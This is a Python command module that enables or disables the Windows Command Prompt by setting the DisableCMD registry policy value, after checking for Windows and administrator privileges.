import ctypes
import os
import platform
try:
    import winreg
except ImportError:
    winreg = None
    
from pydantic import ValidationError
from ..commands import Command, CommandArgs, ICommandModule, CommandResult


command_arg_map = {
    Command.ENABLE_CMD: None,
    Command.DISABLE_CMD: None,
    Command.DISABLE_CMD_FULLY: None
}

class CMD(ICommandModule):
    def is_elevated(self) -> bool:
        if platform.system() == "Windows":
            try:
                return ctypes.windll.shell32.IsUserAnAdmin()
            except:
                return False
        else:
            return os.geteuid() == 0
        
    def change_dword(self, value: int) -> CommandResult:
        if platform.system() != "Windows":
            return CommandResult(success=False, result="This function is supported on Windows only.")
        
        if not self.is_elevated():
            return CommandResult(success=False, result="Elevated privileges are required.")

        try:
            sub_key = "SOFTWARE\\Policies\\Microsoft\\Windows\\System"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, sub_key, 0, winreg.KEY_WRITE) as h:
                winreg.SetValueEx(h, "DisableCMD", 0, winreg.REG_DWORD, value)
            action = 'enabled' if value == 0 else 'disabled'
            return CommandResult(success=True, result=f"CMD has been {action}.")
        except Exception as e:
            return CommandResult(success=False, result=f"Failed to update registry: {str(e)}")

    def run(self, command: Command, args: CommandArgs = None) -> CommandResult:
        command_func_map = {
            Command.ENABLE_CMD: lambda: self.change_dword(0),
            Command.DISABLE_CMD: lambda: self.change_dword(1),
            Command.DISABLE_CMD_FULLY: lambda: self.change_dword(2),
        }

        if command in command_func_map:
            try:
                return command_func_map[command]()
            except ValidationError as e:
                return CommandResult(success=False, result=f"Validation error: {e}")
            except Exception as e:
                return CommandResult(success=False, result=f"Error executing {command}: {e}")
        else:
            return CommandResult(success=False, result="Command not found in module.")